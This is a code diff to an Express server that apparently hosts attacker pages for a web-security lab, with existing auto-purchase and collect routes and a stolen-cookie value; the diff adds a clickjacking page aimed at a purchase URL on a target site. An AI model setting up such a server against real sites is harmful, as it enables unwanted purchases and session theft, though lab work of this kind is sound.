@@ -21,6 +21,7 @@ function renderPage(filename, pageData) {
     <script>
       window.__TARGET_BASE__ = ${JSON.stringify(pageData.targetBase)};
       window.__LAST_STOLEN_COOKIE__ = ${JSON.stringify(pageData.lastStolenCookie)};
+      window.__CLICKJACKING_TARGET__ = ${JSON.stringify(pageData.clickjackingTarget)};
     </script>
     ${body}
   </body>
@@ -45,7 +46,8 @@ function createApp(options) {
   function render(filename) {
     return renderPage(filename, {
       targetBase: config.targetBase,
-      lastStolenCookie: config.state.lastStolenCookie || ""
+      lastStolenCookie: config.state.lastStolenCookie || "",
+      clickjackingTarget: new URL("/purchase/1", config.targetBase).toString()
     });
   }
 
@@ -89,6 +91,11 @@ function createApp(options) {
   app.get("/auto-purchase", (req, res) => {
     res.setHeader("content-type", "text/html; charset=utf-8");
     res.send(render("auto_purchase.html"));
+  });
+
+  app.get("/clickjacking", (req, res) => {
+    res.setHeader("content-type", "text/html; charset=utf-8");
+    res.send(render("clickjacking.html"));
   });
 
   app.get("/collect", (req, res) => {
